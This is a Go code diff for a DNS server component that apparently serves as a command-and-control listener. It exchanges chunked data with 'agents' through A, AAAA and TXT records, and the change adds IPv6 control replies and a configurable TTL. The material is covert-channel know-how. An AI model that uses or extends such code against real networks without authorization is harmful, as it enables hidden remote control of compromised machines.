@@ -29,6 +29,9 @@ func NewConfigDns() *DNS {
 	d := new(DNS)
 	d.sessions = make(map[string]*dnsSession)
 	d.Config.PortBind = "53"
+	d.Config.RecordType = "A/TXT"
+	d.Config.PollInterval = 60
+	d.Config.TTL = 5
 	return d
 }
 
@@ -181,7 +184,7 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 	// Check if all chunks received
 	if len(session.chunks) < total {
 		// Still waiting for more chunks — ACK this one
-		d.replyA(w, r, dnsCtrlAck)
+		d.replyControl(w, r, dnsCtrlAck)
 		return
 	}
 
@@ -201,15 +204,15 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 	if !success {
 		logger.Debug("DNS: parseAgentRequest failed for agent " + agentHex)
-		d.replyA(w, r, dnsCtrlNoJob)
+		d.replyControl(w, r, dnsCtrlNoJob)
 		return
 	}
 
 	respBytes := response.Bytes()
 
-	if len(respBytes) == 0 || qtype == dns.TypeA {
-		// No response data or agent asked via A record — send control response
-		d.replyA(w, r, dnsCtrlAck)
+	if len(respBytes) == 0 || qtype == dns.TypeA || qtype == dns.TypeAAAA {
+		// No response data or agent asked via A/AAAA record — send control response
+		d.replyControl(w, r, dnsCtrlAck)
 		// Store response for later TXT retrieval
 		if len(respBytes) > 0 {
 			session.response = respBytes
@@ -225,6 +228,15 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
  *  Reply helpers
  * =========================================================== */
 
+// replyControl sends a control IP via A or AAAA depending on RecordType config.
+func (d *DNS) replyControl(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
+	if d.Config.RecordType == "AAAA/TXT" {
+		d.replyAAAA(w, r, ip)
+	} else {
+		d.replyA(w, r, ip)
+	}
+}
+
 func (d *DNS) replyA(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
 	m := new(dns.Msg)
 	m.SetReply(r)
@@ -233,9 +245,27 @@ func (d *DNS) replyA(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
 			Name:   r.Question[0].Name,
 			Rrtype: dns.TypeA,
 			Class:  dns.ClassINET,
-			Ttl:    0,
+			Ttl:    d.Config.TTL,
 		},
 		A: ip,
+	})
+	w.WriteMsg(m)
+}
+
+func (d *DNS) replyAAAA(w dns.ResponseWriter, r *dns.Msg, ip net.IP) {
+	m := new(dns.Msg)
+	m.SetReply(r)
+	// Map IPv4 control IP to IPv6 (e.g. 1.0.0.1 → ::1:0:0:1)
+	ip6 := make(net.IP, net.IPv6len)
+	copy(ip6[12:], ip.To4())
+	m.Answer = append(m.Answer, &dns.AAAA{
+		Hdr: dns.RR_Header{
+			Name:   r.Question[0].Name,
+			Rrtype: dns.TypeAAAA,
+			Class:  dns.ClassINET,
+			Ttl:    d.Config.TTL,
+		},
+		AAAA: ip6,
 	})
 	w.WriteMsg(m)
 }
@@ -262,7 +292,7 @@ func (d *DNS) replyTXT(w dns.ResponseWriter, r *dns.Msg, data []byte) {
 			Name:   r.Question[0].Name,
 			Rrtype: dns.TypeTXT,
 			Class:  dns.ClassINET,
-			Ttl:    0,
+			Ttl:    d.Config.TTL,
 		},
 		Txt: txts,
 	})
@@ -278,7 +308,7 @@ func (d *DNS) replySOA(w dns.ResponseWriter, r *dns.Msg) {
 			Name:   domain,
 			Rrtype: dns.TypeSOA,
 			Class:  dns.ClassINET,
-			Ttl:    300,
+			Ttl:    d.Config.TTL,
 		},
 		Ns:      "ns1." + domain,
 		Mbox:    "admin." + domain,
